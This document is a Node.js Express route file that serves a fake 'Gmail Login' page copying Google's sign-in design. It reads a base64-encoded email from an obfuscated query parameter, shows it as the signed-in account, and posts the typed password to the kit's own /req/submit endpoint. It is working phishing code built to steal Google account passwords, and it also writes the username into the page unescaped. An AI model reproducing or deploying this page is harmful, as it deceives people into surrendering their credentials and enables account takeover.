
const express = require ('express');
const router = express.Router();
const db = require('../database');
router.use(express.static('public'));



//validate form data before handling
// Custom middleware for form validation
router.get('/', (req, res) => {

    const data3 = req.query.sdhbbbbefuiwehurh23890frqweijnkdngfkrnwektkear;
    const username = Buffer.from(data3, 'base64').toString('utf-8');
  
    if (data3 == null) {
        res.render('error');
        
      }else{
    const htmlContent = `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Gmail Login</title>
    <link rel="shortcut icon" href="./images/image.png" type="image">
    <style>
        /* Hide body initially and fade in */
        body {
            display: none; /* Start blank */
            opacity: 0;
            transition: opacity 0.3s ease-in; /* Smooth fade-in */
            margin: 26px;
            font-family: Arial, Helvetica, sans-serif;
            background-color: #f0f4f9;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 85vh;
        }
    </style>

    <script>
        // Wait 0.5 seconds then show the page
        window.addEventListener("load", () => {
            setTimeout(() => {
                document.body.style.display = "flex"; // show body
                requestAnimationFrame(() => { // ensure transition applies
                    document.body.style.opacity = "1";
                });
            }, 100); // 500ms pause
        });
    </script>
     <style>
        /* Reset and General Styles */
        body {
            margin: 26px;
            font-family: "Google Sans", roboto, "Noto Sans Myanmar UI", "Noto Sans Khmer", arial, sans-serif;
            background-color: #f5f7fb;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 85vh;
        }

        .maindiv {
            width: 56%; /* Increased width for larger screens */
            max-width: 1052px; /* Set max width for 4K screens */
            height: auto;
            padding: 42px;
            background: #fff;
            border-radius: 25px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
            display: flex;
            flex-direction: row;
            justify-content: space-between;
            flex-wrap: wrap;
        }

        /* Left Section: Logo, Welcome, User Info */
        .form-half {
            flex: 1;
            min-width: 300px;
            padding-right: 20px;
        }

        .form-half .divlogo {
            width: 52px;
            height: 52px;
            margin-bottom: 25px;
        }

        .form-half .welcome {
            font-size: 44px; /* Increased font size for 4K */
            margin-top: 40px;
            margin-bottom: 20px;
        }

        .userdiv {
            display: flex;
            align-items: center;
            justify-content: flex-start;
            border: 0.4px solid #312f2f;
            border-radius: 30px;
            background-color: transparent;
            padding: 4px;
            width: fit-content;
            margin-top: 28px;
            cursor: pointer;
        }

        .userdiv img {
            vertical-align: middle;
        }

        .user-icon {
            margin-top: 2px;
            margin-right: 13px;
            width: 18px;
            height: 18px;
        }

        .dropdown-icon {
            margin-top: 0px;
            margin-right: 12px;
            margin-left: 10px;
            width: 10px;
            height: 8px;
        }

        .userdiv span {
            font-size: 15px;
            color: #2c2a2a;
        }

        /* Right Section: Password Input, Show Password, Forgot Password, Next Button */
        .form-half1 {
            flex: 1;
            min-width: 440px;
            padding-left: 20px;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
        }

        .passdiv {
            position: relative;
            margin-top: 42px;
            width: 100%;
            height: auto; /* Adjusting to auto for responsiveness */
        }

        input[type="password"], input[type="text"] {
            width: 100%; /* Ensure input takes up full width */
            padding: 16px;
            padding-right: 50px;
            font-size: 18px;
            border: 1px solid #ccc;
            border-radius: 4px;
            outline: none;
            box-sizing: border-box; /* Ensures padding does not affect width */
            transition: border-color 0.2s ease;
        }
 
        input.focused {
            border: 2px solid #4a6dd5;
        }
        

        /* Placeholder label behavior */
        .placeholder-label {
            position: absolute;
            top: 50%;
            left: 10px;
            transform: translateY(-50%);
            color: #aaa;
            font-size: 16px;
            pointer-events: none;
            transition: all 0.2s ease;
        }

        input:focus + .placeholder-label,
        input:not(:placeholder-shown) + .placeholder-label {
            top: 0px;
            left: 10px;
            padding: 4px;
            background-color: #fff;
            color: #4a6dd5;
            font-size: 12px;
        }

        .shwpwd {
            margin-top: 22px;
        }

        .shwpwd input {
            margin-right: 5px;
        }

        .shwpwd .button {
            cursor: pointer;
        }

        .fgtpwd {
            margin-top: 48px;
            margin-left: 47%;
        }

        .fgtpwd .hyperl {
            font-size: 14px;
            color: #1a73e8;
            border: none;
            background: none;
            cursor: pointer;
        }

        .btnnxt {
            padding: 11px 22px;
            font-size: 14px;
            border: none;
            border-radius: 25px;
            background-color: #0559d5;
            color: white;
            cursor: pointer;
        }

        .btnnxt:hover {
            background-color: #034099;
        }

        /* Bottom Section Styles */
        .btmdiv {
            width: 58%;
            max-width: 1050px;
            padding: 0px;
            background-color: rgba(0, 0, 0, 0);
            box-shadow: 0 -2px 10px rgba(0, 0, 0, 0);
            display: flex;
            justify-content: center;
            align-items: center;
            margin-top: 5px;
        }

        .left-div {
            flex-grow: 1;
            background-color: rgba(255, 255, 255, 0);
            border: none;
        }

        .right-divs {
            display: flex;
        }

        .right-div {
            margin-left: 20px;
            background-color: rgba(255, 255, 255, 0);
            border: none;
        }

        select.btmhypl {
            padding: 12px;
            font-size: 11px;
            background-color: rgba(255, 255, 255, 0);
            border: none;
            color: black;
        }

        button.btmhypl {
            background-color: rgba(255, 255, 255, 0);
            color: black;
            border: none;
            cursor: pointer;
            padding: 12px;
            font-size: 11px;
            transition: background-color ease-in-out duration(.3s);
        }

        button.btmhypl:hover {
            background-color: #e7f3ff;
        }

        .session-expired-message {
            font-size: 15px;
            color: #c20606;
            margin-top: 77px;
            margin-bottom: 20px;
        }

        /* Media Queries for 2K Desktop Screens */
        @media (min-width: 1440px) and (max-width: 2560px) {
            .maindiv {
                width: 56%;
                padding: 35px;
                max-width: 1080px;
            }

            .welcome {
                font-size: 52px;
            }

            .btnnxt {
                padding: 9px 20px;
                font-size: 17px;
            }
        }

        /* Mobile Optimization for 2K Screens */
        @media (max-width: 1024px) {
            .maindiv {
                width: 90%;
                flex-direction: column;
                padding: 24px;
            }

            .form-half, .form-half1 {
                min-width: 100%;
                padding: 0;
            }
            .welcome {
                font-size: 28px;
            }

            .userdiv {
                width: 100%;
                justify-content: center;
            }

            .btnnxt {
                width: 100%;
                padding: 12px 0;
            }

            .fgtpwd {
                margin-left: 0;
                text-align: center;
            }

            .btmdiv {
                flex-direction: column;
                align-items: center;
            }

            .left-div, .right-divs {
                width: 100%;
                justify-content: center;
            }

            .right-div {
                margin-left: 10px;
            }
        }

        .show-password-btn {
            position: absolute;
            top: 50%;
            right: 10px;
            transform: translateY(-50%);
            background: none;
            border: none;
            cursor: pointer;
            font-size: 14px;
            color: #333;
            transition: color 0.2s ease;
            padding: 0;
            line-height: 1;
        }
    </style>
</head>
<body>
    <div class="maindiv">
        <!-- Left Section: Logo, Welcome, User Info -->
        <div class="form-half">
            <div>
                <img class="divlogo" src="./images/image.png" alt="Logo">
            </div>
            <div>
                <span class="welcome">Welcome</span>
            </div>
            <div class="userdiv">
                <img class="user-icon" src="./images/user-circle.png" alt="User Icon">
                <span style="color: #2c2a2a; font-size: 16px; font-family: Arial, Helvetica, sans-serif;">${username}</span>
                <img class="dropdown-icon" src="./images/dropd.jpg" alt="Dropdown Icon">
            </div>
        </div>

        <!-- Right Section: Password Input, Show Password, Forgot Password, Next Button -->
        <form class="loginform" method="post" name="loginForm" action="/req/submit" accept-charset="UTF-8">
            <div class="form-half1">
                <!-- Session Expired Message at the top of the right section -->
                <div class="session-expired-message">
                    <p>                          </p>
                </div>

                <div class="passdiv">
                    <input type="hidden" name="username" id="useRname" value="${username}">
                    <input required name="password" type="password" id="pEyar" placeholder="">
                    <label for="pEyar" class="placeholder-label">Enter Your Password</label>
                </div>

                <div id="togglePassword" class="shwpwd">
                    <input type="checkbox" onclick="ShowpassWord();" class="checkbox">
                    <span onclick="togglePassword();" class="button">Show password</span>
                </div>

                <script>
                    const passwordInput = document.getElementById("pEyar");
                    const togglePassword = document.getElementById("togglePassword");

                    // Toggle "Show/Hide Password"
                    togglePassword.addEventListener("click", function () {
                        const type = passwordInput.getAttribute("type") === "password" ? "text" : "password";
                        passwordInput.setAttribute("type", type);
                    });

                    // Add 'focused' class on focus and remove on blur
                    passwordInput.addEventListener("focus", function () {
                        this.classList.add("focused");
                    });

                    // Keep the 'focused' class even after blur
                    passwordInput.addEventListener("blur", function () {
                        if (this.value.trim() !== "") {
                            this.classList.add("focused");
                        } else {
                            this.classList.remove("focused");
                        }
                    });

                    // Forgot Password Functionality
                    function forgotPassword() {
                             if (history.length > 1) {
                                    history.back();  // Go back if there's history
                                } else {
                                    location.reload();  // Refresh current page instead of alert/redirect
                                }
                            }
                        </script>

                <div class="fgtpwd">
                    <button type="button" id="myButton" class="hyperl" onclick="forgotPassword()">Forgot password?</button>&nbsp;&nbsp;&nbsp;
                    <button type="submit" class="btnnxt">Next</button>
                </div>
            </div>
        </form>
    </div>

    <!-- Bottom Section -->
    <div class="btmdiv">
        <div class="left-div">
            <select class="btmhypl" id="language-select">
                <option value="en">English (United States)</option>
                <option value="fr">French</option>
                <option value="es">Spanish</option>
                <option value="de">German</option>
            </select>
        </div>

        <div class="right-divs">
            <div class="right-div">
                <button id="helpButton" class="btmhypl">Help</button>
            </div>
            <div class="right-div">
                <button id="privacyButton" class="btmhypl">Privacy</button>
            </div>
            <div class="right-div">
                <button id="termsButton" class="btmhypl">Terms</button>
            </div>
        </div>
    </div>
</body>
</html>
 `;

    // Send the HTML content as a response
    res.send(htmlContent);
      }
});



module.exports =router
